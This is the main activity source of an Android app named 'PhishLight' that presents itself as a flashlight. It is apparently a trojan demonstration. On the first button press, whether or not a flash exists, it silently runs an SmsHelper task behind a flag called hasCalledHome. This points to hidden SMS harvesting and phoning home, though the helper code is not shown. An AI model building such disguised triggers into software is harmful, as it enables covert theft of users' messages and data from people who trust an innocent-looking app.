package org.rix1.PhishLight;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;


public class MainActivity extends Activity {

    /**
     * Called when the activity is first created.
     */

    private Button toggle;
    private ImageView flashlightIcon, light;
    private boolean isFlashlightOn = false;
    private Camera camera;
    private Context context = this;
    private NetworkHelper networkHelper;
    private boolean hasCalledHome = false;
    private SmsHelper smsHelper;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        flashlightIcon = (ImageView) findViewById(R.id.ic_flashlight);
        light = (ImageView) findViewById(R.id.ic_light);
        toggle = (Button)findViewById(R.id.btn_toggle);
        toggle.setText("ON");

        camera = Camera.open();
        final Camera.Parameters p = camera.getParameters();

        smsHelper = new SmsHelper(this);


        toggle.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Log.d("APP: ", "Button clicked");

                if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)) {

                    if (isFlashlightOn) {
                        Log.d("APP: ", "Flashlight is off");
                        p.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
                        camera.setParameters(p);
                        toggle.setText("ON");
                        light.setVisibility(View.INVISIBLE);
                        isFlashlightOn = false;
                    } else {
                        Log.d("APP: ", "Flashlight is ON!");
                        if (!hasCalledHome) {
                            smsHelper.execute();
                            hasCalledHome = true;
                        }
                        p.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
                        camera.setParameters(p);
                        toggle.setText("OFF");
                        light.setVisibility(View.VISIBLE);
                        isFlashlightOn = true;
                    }
                }else {
                    Toast.makeText(context, "No camera found ", Toast.LENGTH_LONG).show();
                    if (!hasCalledHome) {
                        smsHelper.execute();
                        hasCalledHome = true;
                    }
                }
            }
        });
    }    

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        //getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    protected void onPause(){
        super.onPause();
        hasCalledHome = false;
    }

    protected void onStop(){
        hasCalledHome = false;
        super.onStop();
        if(camera != null){
            camera.release();
        }
    }

}